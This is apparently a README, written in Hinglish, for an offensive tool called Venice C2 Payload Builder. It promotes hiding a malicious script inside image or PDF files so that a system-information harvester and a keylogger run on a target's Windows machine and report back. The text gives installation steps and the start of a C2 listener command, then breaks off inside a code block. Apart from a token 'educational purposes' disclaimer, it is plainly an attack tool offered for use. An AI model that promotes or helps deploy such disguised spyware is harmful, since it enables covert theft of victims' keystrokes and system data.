# 🐾 Venice C2 Payload Builder 🐾

Ek aisi tool jo tumhe social engineering payloads banane mein madad karti hai. Is tool se tum ek image ya PDF file ko malicious script ke saath combine kar sakte ho aur target ke system se information extract kar sakte ho.

⚠️ **DISCLAIMER:** Ye tool sirf educational purposes ke liye hai. Kisi bhi illegal activity ke liye iska use strictly prohibited hai. Author kisi bhi liability ke zimmedar nahi hai.

## Features:

-   **Attractive GUI:** Zphisher jaisi clean aur attractive interface.
-   **Dual Payloads:**
    1.  **System Info Harvester:** Target ka phone (Windows PC) ka detail like OS, RAM, Battery status, etc. le aata hai.
    2.  **Keylogger:** Target ke typing ka record rakhta hai aur regularly tumhe bhejta hai.
-   **File Support:** Image (`.jpg`, `.png`) aur PDF (`.pdf`) files ko support karta hai.
-   **Easy to Use:** Simple commands se install aur use kar sakte ho.

## Installation on Kali Linux:

1.  Repository ko clone karo:
    ```bash
    git clone https://github.com/YOUR_USERNAME/Venice-C2-Tool.git
    cd Venice-C2-Tool
    ```

2.  Installer script run karo:
    ```bash
    chmod +x install.sh
    ./install.sh
    ```
    Ye sab kuch automatically install kar dega.

## Usage:

### Part 1: C2 Listener Start Karna

Terminal me ye command run karo (tumhare Kali IP ke saath):

```bash
python3 listener.py -i 192.168.1.10 -p 4444
